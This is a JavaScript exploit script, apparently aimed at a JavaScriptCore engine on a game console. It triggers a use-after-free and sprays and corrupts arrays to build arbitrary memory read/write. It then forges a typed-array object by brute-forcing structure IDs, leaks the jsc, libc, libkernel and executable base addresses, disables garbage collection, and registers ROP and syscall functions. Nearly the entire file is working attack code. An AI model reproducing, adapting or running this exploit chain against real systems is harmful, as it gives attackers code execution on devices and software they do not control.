include('types.js')
include('defs.js')

// needed for arw
var u32_structs
var spray_size = 0x100
var marked_arr_offset = -1
var corrupted_arr_idx = -1
var marker = new BigInt(0xFFFF0000, 0x13371337)
var indexing_header = new BigInt(spray_size, spray_size)

// used for arw
var master, slave, master_addr, slave_addr, slave_buf_addr

// used for addrof/fakeobj
var leak_obj, leak_obj_addr

log('Initiate UAF...')

var uaf_view = new DataView(new ArrayBuffer(0x100000))

uaf_view.setUint32(0x10, 0xB0, true)

make_uaf(uaf_view)

log('Achieved UAF !!')

log('Spraying arrays with marker...')
// spray candidates arrays to be used as leak primitive
var spray = new Array(0x1000)
for (var i = 0; i < spray.length; i++) {
  spray[i] = new Array(spray_size).fill(0x13371337)
}

log('Looking for marked array...')
// find sprayed candidate by marker then corrupt its length
for (var i = 8; i < uaf_view.byteLength; i += 16) {
  if (uaf_view.getBigInt(i - 8, true).eq(indexing_header) &&
    uaf_view.getBigInt(i, true).eq(marker)) {
    log(`Found marker at uaf_view[${i}] !!`)

    marked_arr_offset = i - 8

    log(`Marked indexing header ${uaf_view.getBigInt(marked_arr_offset, true)}`)

    var corrupted_indexing_header = new BigInt(0x1337, 0x1337)

    log('Corrupting marked array length...')
    // corrupt indexing header
    uaf_view.setBigInt(marked_arr_offset, corrupted_indexing_header, true)
    break
  }
}

if (marked_arr_offset === -1) {
  throw new Error('Failed to find marked array !!')
}

// find index of corrupted array
for (var i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    log(`Found corrupted array at spray[${i}] !!`)
    log(`Corrupted array length ${new BigInt(spray[i].length)}`)

    corrupted_arr_idx = i
    break
  }
}

if (corrupted_arr_idx === -1) {
  throw new Error('Failed to find corrupted array !!')
}

log('Initiate ARW...')

var marked_arr_obj_offset = marked_arr_offset + 0x10

slave = new DataView(new ArrayBuffer(0x30))
slave.setUint32(0, 0x13371337, true)

// leak address of leak_obj
leak_obj = { obj: slave }

spray[corrupted_arr_idx][1] = leak_obj

leak_obj_addr = uaf_view.getBigInt(marked_arr_obj_offset, true)

// store Uint32Array structure ids to be used for fake master id later
u32_structs = new Array(0x100)
for (var i = 0; i < u32_structs.length; i++) {
  u32_structs[i] = new Uint32Array(1)
  u32_structs[i][`spray_${i}`] = 0x1337
}

var js_cell = new BigInt()
var length_and_flags = new BigInt(1, 0x30)
var rw_obj = { js_cell: js_cell.d(), butterfly: null, vector: slave, length_and_flags: length_and_flags.d() }

// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
var structure_id = 0x80
while (!(master instanceof Uint32Array)) {
  js_cell = new BigInt(
    0x00 | // IndexingType::NonArray
    0x23 << 8 | // JSType::Uint32ArrayType
    0xE0 << 16 | // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero | TypeInfo::InlineTypeFlags::StructureIsImmortal
    0x01 << 24, // CellType::DefinitelyWhite
    structure_id++ // StructureID
  )

  rw_obj.js_cell = js_cell.jsv()

  spray[corrupted_arr_idx][1] = rw_obj

  var rw_obj_addr = uaf_view.getBigInt(marked_arr_obj_offset, true)

  master_addr = rw_obj_addr.add(0x10)

  uaf_view.setBigInt(marked_arr_obj_offset, master_addr, true)

  master = spray[corrupted_arr_idx][1]
}

slave_addr = mem.addrof(slave)

// Fix master
mem.view(master_addr).setBigInt(8, 0, true)
mem.view(master_addr).setBigInt(0x18, length_and_flags, true)

// Fix slave
mem.view(slave_addr).setUint8(6, 0xA0) // TypeInfo::InlineTypeFlags::OverridesGetOwnPropertySlot | TypeInfo::InlineTypeFlags::StructureIsImmortal
mem.view(slave_addr).setInt32(0x18, -1, true)
mem.view(slave_addr).setInt32(0x1C, 1, true)

var slave_buf_addr = mem.view(slave_addr).getBigInt(0x20, true)
mem.view(slave_buf_addr).setInt32(0x20, -1, true)

log('Achieved ARW !!')

var math_min_addr = mem.addrof(Math.min)
debug(`addrof(Math.min): ${math_min_addr}`)

var scope = mem.view(math_min_addr).getBigInt(0x10, true)
debug(`scope: ${scope}`)

var native_executable = mem.view(math_min_addr).getBigInt(0x18, true)
debug(`native_executable: ${native_executable}`)

var native_executable_function = mem.view(native_executable).getBigInt(0x40, true)
debug(`native_executable_function: ${native_executable_function}`)

var native_executable_constructor = mem.view(native_executable).getBigInt(0x48, true)
debug(`native_executable_constructor: ${native_executable_constructor}`)

var jsc_addr = native_executable_function.sub(0xC6380)

var _error_addr = mem.view(jsc_addr).getBigInt(0x1E72398, true)
debug(`_error_addr: ${_error_addr}`)

var strerror_addr = mem.view(jsc_addr).getBigInt(0x1E723B8, true)
debug(`strerror_addr: ${strerror_addr}`)

var libc_addr = strerror_addr.sub(0x40410)

var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
debug(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)

var native_invoke_addr = mem.view(jsmaf_gc_addr).getBigInt(0x18, true)
debug(`native_invoke_addr: ${native_invoke_addr}`)

var eboot_addr = native_invoke_addr.sub(0x39330)

mem.view(jsc_addr).setUint32(0x1E75B20, 1, true)
log('Disabled GC')

rop.init(jsc_addr)

fn.register(libc_addr.add(0x5F0), 'sceKernelGetModuleInfoForUnwind', 'bigint')

var libkernel_addr = utils.base_addr(_error_addr)

log(`jsc address: ${jsc_addr}`)
log(`libc address: ${libc_addr}`)
log(`libkernel address: ${libkernel_addr}`)
log(`eboot address: ${eboot_addr}`)

syscalls.init(libkernel_addr)

debug(`Found ${syscalls.map.size} syscalls`)

fn.register(_error_addr, '_error', 'bigint')
fn.register(strerror_addr, 'strerror', 'string')
fn.register(0x14, 'getpid', 'bigint')
fn.register(0x29, 'dup', 'bigint')
fn.register(0x4, 'write', 'bigint')
fn.register(0x5, 'open', 'bigint')
fn.register(0x6, 'close', 'bigint')

// utils.notify('UwU')
